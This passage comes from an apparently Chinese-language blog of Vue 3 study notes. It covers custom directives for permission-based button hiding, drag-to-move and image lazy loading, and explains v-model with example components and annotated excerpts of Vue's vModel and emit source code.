<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;button @click=&quot;flag=!flag&quot;&gt;切换&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;background=(background===&#x27;cyan&#x27;?&#x27;orange&#x27;:&#x27;cyan&#x27;)&quot;&gt;更新&lt;/button&gt;</span><br><span class="line">    &lt;A v-if=&quot;flag&quot; v-move:abc.def=&quot;&#123;background&#125;&quot;&gt;&lt;/A&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import A from &quot;@/components/A.vue&quot;</span><br><span class="line">import type &#123; DirectiveBinding &#125; from &quot;vue&quot;</span><br><span class="line">import type &#123; Directive &#125; from &quot;vue&quot;</span><br><span class="line"></span><br><span class="line">const flag = ref&lt;boolean&gt;(true)</span><br><span class="line">const background = ref&lt;string&gt;(&quot;cyan&quot;)</span><br><span class="line"></span><br><span class="line">type Dir = &#123;</span><br><span class="line">  background:string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 命名规范：必须以v开头</span><br><span class="line">const vMove: Directive = &#123;</span><br><span class="line">  // 每一个钩子函数里都能收到传值、参数和修饰符</span><br><span class="line">  // 一般用到mounted、updated和unmounted比较多</span><br><span class="line">  /**</span><br><span class="line">   * 可以使用这些参数做些事情</span><br><span class="line">   * @param el 被绑定自定义指令的元素</span><br><span class="line">   * @param dir 传入的内容，包括参数、修饰符、传值、上次的传值、当前组件实例</span><br><span class="line">   * @param vNode 当前组件的虚拟DOM</span><br><span class="line">   * @param preVNode 上次的虚拟DOM</span><br><span class="line">   */</span><br><span class="line">  created(el:HTMLElement, dir:DirectiveBinding&lt;Dir&gt;, vNode, preVNode) &#123;</span><br><span class="line">    console.log(&quot;vMove created&quot;)</span><br><span class="line">  &#125;,</span><br><span class="line">  beforeMount(el, dir, vNode, preVNode) &#123;</span><br><span class="line">    console.log(&quot;vMove beforeMount&quot;)</span><br><span class="line">  &#125;,</span><br><span class="line">  mounted(el, dir, vNode, preVNode) &#123;</span><br><span class="line">    console.log(&quot;vMove mounted&quot;)</span><br><span class="line">    el.style.background = dir.value.background</span><br><span class="line">  &#125;,</span><br><span class="line">  beforeUpdate(el, dir, vNode, preVNode) &#123;</span><br><span class="line">    console.log(&quot;vMove beforeUpdate&quot;)</span><br><span class="line">  &#125;,</span><br><span class="line">  updated(el, dir, vNode, preVNode) &#123;</span><br><span class="line">    console.log(&quot;vMove Updated&quot;)</span><br><span class="line">    el.style.background = dir.value.background</span><br><span class="line">  &#125;,</span><br><span class="line">  beforeUnmount(el, dir, vNode, preVNode) &#123;</span><br><span class="line">    console.log(&quot;vMove beforeUnmount&quot;)</span><br><span class="line">  &#125;,</span><br><span class="line">  unmounted(el, dir, vNode, preVNode) &#123;</span><br><span class="line">    console.log(&quot;vMove Unmounted&quot;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>A.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;a&quot;&gt;</span><br><span class="line">    &lt;h1&gt;A组件&lt;/h1&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">.a &#123;</span><br><span class="line">  width: 200px;</span><br><span class="line">  height: 200px;</span><br><span class="line">  border: 1px solid #ccc;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<h2 id="函数简写"><a href="#函数简写" class="headerlink" title="函数简写"></a>函数简写</h2><p>如果只关心mounted和updated，并在两个时刻触发相同行为，而不关系其他的钩子函数，就可以使用简写。</p>
<p>权限校验案例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;btns&quot;&gt;</span><br><span class="line">    &lt;button v-has-show=&quot;&#x27;shop:create&#x27;&quot;&gt;创建&lt;/button&gt;</span><br><span class="line">    &lt;button v-has-show=&quot;&#x27;shop:edit&#x27;&quot;&gt;编辑&lt;/button&gt;</span><br><span class="line">    &lt;button v-has-show=&quot;&#x27;shop:delete&#x27;&quot;&gt;删除&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import type &#123; Directive &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">localStorage.setItem(&quot;userId&quot;,&quot;114514&quot;)</span><br><span class="line"></span><br><span class="line">// mock后台返回的权限数据</span><br><span class="line">const permission = [</span><br><span class="line">  &quot;114514:shop:edit&quot;,</span><br><span class="line">  &quot;114514:shop:create&quot;,</span><br><span class="line">  &quot;114514:shop:delete&quot;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">const userId = localStorage.getItem(&quot;userId&quot;) as string</span><br><span class="line">const vHasShow:Directive&lt;HTMLElement,string&gt; = (el:HTMLElement, binding:DirectiveBinding)=&gt; &#123;</span><br><span class="line">  // 如果权限表不包含这一条权限，隐藏，否则显示</span><br><span class="line">  if(!permission.includes(userId+&quot;:&quot;+binding.value)) &#123;</span><br><span class="line">    el.style.display = &quot;none&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot;&gt;</span><br><span class="line">.btns &#123;</span><br><span class="line">  button &#123;</span><br><span class="line">    margin: 10px;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>内容拖拽案例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div v-move class=&quot;box&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;header&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div&gt;内容&lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import type &#123; DirectiveBinding &#125; from &#x27;vue&#x27;;</span><br><span class="line">import type &#123; Directive &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">const vMove:Directive&lt;any,void&gt; = (el:HTMLElement, binding:DirectiveBinding)=&gt; &#123;</span><br><span class="line">  let moveElement:HTMLDivElement = el.firstElementChild as HTMLDivElement</span><br><span class="line">  const mouseDown = (e:MouseEvent)=&gt; &#123;</span><br><span class="line">    let X = e.clientX - el.offsetLeft</span><br><span class="line">    let Y = e.clientY - el.offsetTop</span><br><span class="line">    const move = (e:MouseEvent)=&gt; &#123;</span><br><span class="line">      el.style.left = e.clientX - X +&quot;px&quot;</span><br><span class="line">      el.style.top = e.clientY - Y +&quot;px&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    document.addEventListener(&quot;mousemove&quot;,move)</span><br><span class="line">    document.addEventListener(&quot;mouseup&quot;,()=&gt;&#123;</span><br><span class="line">      document.removeEventListener(&quot;mousemove&quot;,move)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  moveElement.addEventListener(&quot;mousedown&quot;,mouseDown)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot;&gt;</span><br><span class="line">.box &#123;</span><br><span class="line">  position: fixed;</span><br><span class="line">  left: 50%;</span><br><span class="line">  top: 50%;</span><br><span class="line">  transform: translate(-50%, -50%);</span><br><span class="line">  width: 200px;</span><br><span class="line">  height: 200px;</span><br><span class="line">  border: 1px solid #ccc;</span><br><span class="line">  .header &#123;</span><br><span class="line">    height: 20px;</span><br><span class="line">    background: black;</span><br><span class="line">    cursor: move;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>图片懒加载案例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;img v-lazy=&quot;item&quot; width=&quot;350&quot; height=&quot;350&quot; v-for=&quot;(item,index) in arr&quot; :key=&quot;index&quot; alt=&quot;&quot;&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import type &#123; Directive &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// glob默认懒加载，就像这样</span><br><span class="line">// let modules = &#123;</span><br><span class="line">//   &quot;xxx&quot;: ()=&gt; import(&quot;xxxxx&quot;)</span><br><span class="line">// &#125;</span><br><span class="line"></span><br><span class="line">// 开启eager是静态加载，就像这样</span><br><span class="line">// import xxx from &quot;xxxxx&quot;</span><br><span class="line"></span><br><span class="line">const imageList:Record&lt;string,&#123;default:string&#125;&gt; = import.meta.glob(&quot;./assets/images/*.*&quot;,&#123;eager:true&#125;)</span><br><span class="line">const arr = Object.values(imageList).map((v:any)=&gt;v.default)</span><br><span class="line"></span><br><span class="line">let vLazy:Directive&lt;HTMLImageElement,string&gt; = async (el,binding)=&gt; &#123;</span><br><span class="line">  // 默认展示加载图片</span><br><span class="line">  const def = await import(&quot;@/assets/loading.gif&quot;)</span><br><span class="line">  el.src = def.default</span><br><span class="line"></span><br><span class="line">  // 滑到可视区内再替换</span><br><span class="line">  // IntersectionObserver监控元素是否在可视区内</span><br><span class="line">  // 虚拟列表也可以通过这个API实现</span><br><span class="line">  // https://developer.mozilla.org/zh-CN/docs/Web/API/IntersectionObserver</span><br><span class="line">  const observer = new IntersectionObserver((en)=&gt; &#123;</span><br><span class="line">    // intersectionRatio 元素被展现的比例（不在视口外的比例）</span><br><span class="line">    if(en[0].intersectionRatio&gt;0) &#123;</span><br><span class="line">      el.src=binding.value</span><br><span class="line">      // 停止监听</span><br><span class="line">      observer.unobserve(el)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  observer.observe(el)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>TSX</title>
    <url>/web/study/Vue/26.%E6%B7%B1%E5%85%A5v-model.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="v-model"><a href="#v-model" class="headerlink" title="v-model"></a>v-model</h1><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305251458907.png" alt="v-model支持的元素"></p>
<p>v-model其实就是一个语法糖，通过props和emits组合而成的。</p>
<p>Vue3的v-model相比Vue2作了如下变动：</p>
<ol>
<li>prop：value→modelValue</li>
<li>事件：input→update:modelValue（Vue2里sync的写法）</li>
<li>移除了v-bind的.sync修饰符和组件的model选项</li>
<li>新增了支持多个v-model的特性</li>
<li>新增支持自定义修饰符Modifiers的特性</li>
</ol>
<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;App.vue（父组件）&lt;/h1&gt;</span><br><span class="line">    &lt;div&gt;isShow：&#123;&#123; isShow &#125;&#125;&lt;/div&gt;</span><br><span class="line">    &lt;div&gt;text：&#123;&#123; text &#125;&#125;&lt;/div&gt;</span><br><span class="line">    &lt;div&gt;&lt;button @click=&quot;isShow = !isShow&quot;&gt;开关&lt;/button&gt;&lt;/div&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;!-- Vue3支持多个v-model，通过冒号后面的名字进行接收 --&gt;</span><br><span class="line">    &lt;!-- Vue3还支持自定义修饰符，这里加入了自定义修饰符abc --&gt;</span><br><span class="line">    &lt;VModel v-model=&quot;isShow&quot; v-model:textVal.abc=&quot;text&quot;&gt;&lt;/VModel&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import VModel from &quot;@/components/VModel.vue&quot;</span><br><span class="line"></span><br><span class="line">const isShow = ref&lt;boolean&gt;(false)</span><br><span class="line">const text = ref&lt;string&gt;(&quot;yajue&quot;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>VModel.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div v-if=&quot;modelValue&quot; class=&quot;model&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;close&quot;&gt;&lt;button @click=&quot;close&quot;&gt;关闭&lt;/button&gt;&lt;/div&gt;</span><br><span class="line">    &lt;h3&gt;我是v-model子组件&lt;/h3&gt;</span><br><span class="line">    &lt;div&gt;内容：&lt;input @input=&quot;change&quot; :value=&quot;textVal&quot; type=&quot;text&quot;&gt;&lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line"></span><br><span class="line">// vue3 默认值modelValue</span><br><span class="line">const props = defineProps&lt;&#123;</span><br><span class="line">  // 收到了父组件传来的isShow</span><br><span class="line">  modelValue: boolean</span><br><span class="line">  // 收到了父组件传来的text</span><br><span class="line">  textVal: string</span><br><span class="line">  // 如果是默认值的话就是modelModifiers</span><br><span class="line">  textValModifiers?: &#123;</span><br><span class="line">    // 都是布尔值</span><br><span class="line">    abc:boolean</span><br><span class="line">  &#125;</span><br><span class="line">&#125;&gt;()</span><br><span class="line"></span><br><span class="line">// vue3 默认值update:modelValue</span><br><span class="line">const emit = defineEmits([&quot;update:modelValue&quot;,&quot;update:textVal&quot;])</span><br><span class="line"></span><br><span class="line">const close = ()=&gt; &#123;</span><br><span class="line">  // 给父组件回传isShow</span><br><span class="line">  emit(&quot;update:modelValue&quot;,false)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const change = (e:Event)=&gt; &#123;</span><br><span class="line">  const target = e.target as HTMLInputElement</span><br><span class="line">  // 给父组件回传text</span><br><span class="line">  // 如果加入了abc修饰符，每次输入时在text的末尾加上abc，否则不加</span><br><span class="line">  emit(&quot;update:textVal&quot;, props?.textValModifiers?.abc? target.value + &quot;abc&quot;: target.value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 很多第三方组件上的v-model就是这么封装的</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.model &#123;</span><br><span class="line">  width: 500px;</span><br><span class="line">  border: 5px solid #ccc;</span><br><span class="line">  padding: 10px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>在Vue源码（<code>/package/runtime-dom/src/directives/vModel.ts</code>）中可以看到v-model的源码。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// We are exporting the v-model runtime directly as vnode hooks so that it can</span></span><br><span class="line"><span class="comment">// be tree-shaken in case v-model is never used.</span></span><br><span class="line"><span class="comment">// 一个自定义指令</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="attr">vModelText</span>: <span class="title class_">ModelDirective</span>&lt;</span><br><span class="line">  <span class="title class_">HTMLInputElement</span> | <span class="title class_">HTMLTextAreaElement</span></span><br><span class="line">&gt; = &#123;</span><br><span class="line">  <span class="comment">// el dom节点对象   binding对象（内置修饰符）   vnode</span></span><br><span class="line">  <span class="title function_">created</span>(<span class="params">el, &#123; modifiers: &#123; lazy, trim, <span class="built_in">number</span> &#125; &#125;, vnode</span>) &#123;</span><br><span class="line">    <span class="comment">// 获取props中的modelValue属性对应的函数</span></span><br><span class="line">    el.<span class="property">_assign</span> = <span class="title function_">getModelAssigner</span>(vnode)</span><br><span class="line">    <span class="keyword">const</span> castToNumber =</span><br><span class="line">      <span class="built_in">number</span> || (vnode.<span class="property">props</span> &amp;&amp; vnode.<span class="property">props</span>.<span class="property">type</span> === <span class="string">&#x27;number&#x27;</span>)</span><br><span class="line">  	<span class="comment">// 通过addEventListener 如果有lazy修饰符，触发change</span></span><br><span class="line">    <span class="comment">// 因为change只有在改变值且鼠标离开焦点才会触发，而input会频繁触发</span></span><br><span class="line">    <span class="title function_">addEventListener</span>(el, lazy ? <span class="string">&#x27;change&#x27;</span> : <span class="string">&#x27;input&#x27;</span>, <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> ((e.<span class="property">target</span> <span class="keyword">as</span> <span class="built_in">any</span>).<span class="property">composing</span>) <span class="keyword">return</span></span><br><span class="line">      <span class="keyword">let</span> <span class="attr">domValue</span>: <span class="built_in">string</span> | <span class="built_in">number</span> = el.<span class="property">value</span></span><br><span class="line">      <span class="comment">// 如果有trim修饰符，去除左右空格</span></span><br><span class="line">      <span class="keyword">if</span> (trim) &#123;</span><br><span class="line">        domValue = domValue.<span class="title function_">trim</span>()</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 如果有number修饰符，转成数字</span></span><br><span class="line">      <span class="keyword">if</span> (castToNumber) &#123;</span><br><span class="line">        domValue = <span class="title function_">looseToNumber</span>(domValue)</span><br><span class="line">      &#125;</span><br><span class="line">      el.<span class="title function_">_assign</span>(domValue)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">// 如果触发的是change事件，有修饰符trim也要去除左右空格</span></span><br><span class="line">    <span class="keyword">if</span> (trim) &#123;</span><br><span class="line">      <span class="title function_">addEventListener</span>(el, <span class="string">&#x27;change&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        el.<span class="property">value</span> = el.<span class="property">value</span>.<span class="title function_">trim</span>()</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!lazy) &#123;</span><br><span class="line">      <span class="comment">// lazy 中文输入法特殊处理</span></span><br><span class="line">      <span class="comment">// 当用户选中输入法输入的值，手动触发input</span></span><br><span class="line">      <span class="title function_">addEventListener</span>(el, <span class="string">&#x27;compositionstart&#x27;</span>, onCompositionStart)</span><br><span class="line">      <span class="title function_">addEventListener</span>(el, <span class="string">&#x27;compositionend&#x27;</span>, onCompositionEnd)</span><br><span class="line">      <span class="comment">// Safari &lt; 10.2 &amp; UIWebView doesn&#x27;t fire compositionend when</span></span><br><span class="line">      <span class="comment">// switching focus before confirming composition choice</span></span><br><span class="line">      <span class="comment">// this also fixes the issue where some browsers e.g. iOS Chrome</span></span><br><span class="line">      <span class="comment">// fires &quot;change&quot; instead of &quot;input&quot; on autocomplete.</span></span><br><span class="line">      <span class="title function_">addEventListener</span>(el, <span class="string">&#x27;change&#x27;</span>, onCompositionEnd)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// set value on mounted so it&#x27;s after min/max for type=&quot;range&quot;</span></span><br><span class="line">  <span class="title function_">mounted</span>(<span class="params">el, &#123; value &#125;</span>) &#123;</span><br><span class="line">    <span class="comment">// 初始化赋值，绑定的值赋给value，目前只是单向流动</span></span><br><span class="line">    el.<span class="property">value</span> = value == <span class="literal">null</span> ? <span class="string">&#x27;&#x27;</span> : value</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">beforeUpdate</span>(<span class="params">el, &#123; value, modifiers: &#123; lazy, trim, <span class="built_in">number</span> &#125; &#125;, vnode</span>) &#123;</span><br><span class="line">    el.<span class="property">_assign</span> = <span class="title function_">getModelAssigner</span>(vnode)</span><br><span class="line">    <span class="comment">// avoid clearing unresolved text. #2302</span></span><br><span class="line">    <span class="keyword">if</span> ((el <span class="keyword">as</span> <span class="built_in">any</span>).<span class="property">composing</span>) <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">activeElement</span> === el &amp;&amp; el.<span class="property">type</span> !== <span class="string">&#x27;range&#x27;</span>) &#123;</span><br><span class="line">      <span class="comment">// 如果设了lazy，返回</span></span><br><span class="line">      <span class="keyword">if</span> (lazy) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 如果设了trim且值已经去过空格，返回</span></span><br><span class="line">      <span class="keyword">if</span> (trim &amp;&amp; el.<span class="property">value</span>.<span class="title function_">trim</span>() === value) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 如果设了number且值已经是number，返回</span></span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line">        (<span class="built_in">number</span> || el.<span class="property">type</span> === <span class="string">&#x27;number&#x27;</span>) &amp;&amp;</span><br><span class="line">        <span class="title function_">looseToNumber</span>(el.<span class="property">value</span>) === value</span><br><span class="line">      ) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> newValue = value == <span class="literal">null</span> ? <span class="string">&#x27;&#x27;</span> : value</span><br><span class="line">    <span class="comment">// 新值和旧值不一样才更新</span></span><br><span class="line">    <span class="keyword">if</span> (el.<span class="property">value</span> !== newValue) &#123;</span><br><span class="line">      el.<span class="property">value</span> = newValue</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>emit的源码位于<code>/package/runtime-core/src/componentEmits.ts</code>，v-model需要和emit配合进行更新。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">emit</span>(<span class="params"></span></span><br><span class="line"><span class="params">  instance: ComponentInternalInstance,</span></span><br><span class="line"><span class="params">  event: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  ...rawArgs: <span class="built_in">any</span>[]</span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (instance.<span class="property">isUnmounted</span>) <span class="keyword">return</span></span><br><span class="line">  <span class="comment">// 读取当前实例的props对象</span></span><br><span class="line">  <span class="keyword">const</span> props = instance.<span class="property">vnode</span>.<span class="property">props</span> || <span class="variable constant_">EMPTY_OBJ</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;</span><br><span class="line">      emitsOptions,</span><br><span class="line">      <span class="attr">propsOptions</span>: [propsOptions]</span><br><span class="line">    &#125; = instance</span><br><span class="line">    <span class="keyword">if</span> (emitsOptions) &#123;</span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line">        !(event <span class="keyword">in</span> emitsOptions) &amp;&amp;</span><br><span class="line">        !(</span><br><span class="line">          __COMPAT__ &amp;&amp;</span><br><span class="line">          (event.<span class="title function_">startsWith</span>(<span class="string">&#x27;hook:&#x27;</span>) ||</span><br><span class="line">            event.<span class="title function_">startsWith</span>(compatModelEventPrefix))</span><br><span class="line">        )</span><br><span class="line">      ) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!propsOptions || !(<span class="title function_">toHandlerKey</span>(event) <span class="keyword">in</span> propsOptions)) &#123;</span><br><span class="line">          <span class="title function_">warn</span>(</span><br><span class="line">            <span class="string">`Component emitted event &quot;<span class="subst">$&#123;event&#125;</span>&quot; but it is neither declared in `</span> +</span><br><span class="line">              <span class="string">`the emits option nor as an &quot;<span class="subst">$&#123;toHandlerKey(event)&#125;</span>&quot; prop.`</span></span><br><span class="line">          )</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> validator = emitsOptions[event]</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isFunction</span>(validator)) &#123;</span><br><span class="line">          <span class="keyword">const</span> isValid = <span class="title function_">validator</span>(...rawArgs)</span><br><span class="line">          <span class="keyword">if</span> (!isValid) &#123;</span><br><span class="line">            <span class="title function_">warn</span>(</span><br><span class="line">              <span class="string">`Invalid event arguments: event validation failed for event &quot;<span class="subst">$&#123;event&#125;</span>&quot;.`</span></span><br><span class="line">            )</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> args = rawArgs</span><br><span class="line">  <span class="comment">// 查看事件是否是update:开头</span></span><br><span class="line">  <span class="keyword">const</span> isModelListener = event.<span class="title function_">startsWith</span>(<span class="string">&#x27;update:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// for v-model update:xxx events, apply modifiers on args</span></span><br><span class="line">  <span class="comment">// 是的话就截取掉，获得后面那段</span></span><br><span class="line">  <span class="keyword">const</span> modelArg = isModelListener &amp;&amp; event.<span class="title function_">slice</span>(<span class="number">7</span>)</span><br><span class="line">  <span class="keyword">if</span> (modelArg &amp;&amp; modelArg <span class="keyword">in</span> props) &#123;</span><br><span class="line">    <span class="keyword">const</span> modifiersKey = <span class="string">`<span class="subst">$&#123;</span></span></span><br><span class="line"><span class="subst"><span class="string">      modelArg === <span class="string">&#x27;modelValue&#x27;</span> ? <span class="string">&#x27;model&#x27;</span> : modelArg</span></span></span><br><span class="line"><span class="subst"><span class="string">    &#125;</span>Modifiers`</span></span><br><span class="line">    <span class="comment">// 获取v-model的修饰符，回传的时候也会做处理</span></span><br><span class="line">    <span class="keyword">const</span> &#123; <span class="built_in">number</span>, trim &#125; = props[modifiersKey] || <span class="variable constant_">EMPTY_OBJ</span></span><br><span class="line">    <span class="keyword">if</span> (trim) &#123;</span><br><span class="line">      args = rawArgs.<span class="title function_">map</span>(<span class="function"><span class="params">a</span> =&gt;</span> (<span class="title function_">isString</span>(a) ? a.<span class="title function_">trim</span>() : a))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">number</span>) &#123;</span><br><span class="line">      args = rawArgs.<span class="title function_">map</span>(looseToNumber)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__DEV__ || __FEATURE_PROD_DEVTOOLS__) &#123;</span><br><span class="line">    <span class="title function_">devtoolsComponentEmit</span>(instance, event, args)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">    <span class="keyword">const</span> lowerCaseEvent = event.<span class="title function_">toLowerCase</span>()</span><br><span class="line">    <span class="keyword">if</span> (lowerCaseEvent !== event &amp;&amp; props[<span class="title function_">toHandlerKey</span>(lowerCaseEvent)]) &#123;</span><br><span class="line">      <span class="title function_">warn</span>(</span><br><span class="line">        <span class="string">`Event &quot;<span class="subst">$&#123;lowerCaseEvent&#125;</span>&quot; is emitted in component `</span> +</span><br><span class="line">          <span class="string">`<span class="subst">$&#123;formatComponentName(</span></span></span><br><span class="line"><span class="subst"><span class="string">            instance,</span></span></span><br><span class="line"><span class="subst"><span class="string">            instance.<span class="keyword">type</span></span></span></span><br><span class="line"><span class="subst"><span class="string">          )&#125;</span> but the handler is registered for &quot;<span class="subst">$&#123;event&#125;</span>&quot;. `</span> +</span><br><span class="line">          <span class="string">`Note that HTML attributes are case-insensitive and you cannot use `</span> +</span><br><span class="line">          <span class="string">`v-on to listen to camelCase events when using in-DOM templates. `</span> +</span><br><span class="line">          <span class="string">`You should probably use &quot;<span class="subst">$&#123;hyphenate(event)&#125;</span>&quot; instead of &quot;<span class="subst">$&#123;event&#125;</span>&quot;.`</span></span><br><span class="line">      )</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// handlerName = on+事件名称</span></span><br><span class="line">  <span class="keyword">let</span> handlerName</span><br><span class="line">  <span class="keyword">let</span> handler =</span><br><span class="line">    props[(handlerName = <span class="title function_">toHandlerKey</span>(event))] ||</span><br><span class="line">    <span class="comment">// also try camelCase event handler (#2249)</span></span><br><span class="line">    props[(handlerName = <span class="title function_">toHandlerKey</span>(<span class="title function_">camelize</span>(event)))]</span><br><span class="line">  <span class="comment">// for v-model update:xxx events, also trigger kebab-case equivalent</span></span><br><span class="line">  <span class="comment">// for props passed via kebab-case</span></span><br><span class="line">  <span class="keyword">if</span> (!handler &amp;&amp; isModelListener) &#123;</span><br><span class="line">    handler = props[(handlerName = <span class="title function_">toHandlerKey</span>(<span class="title function_">hyphenate</span>(event)))]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 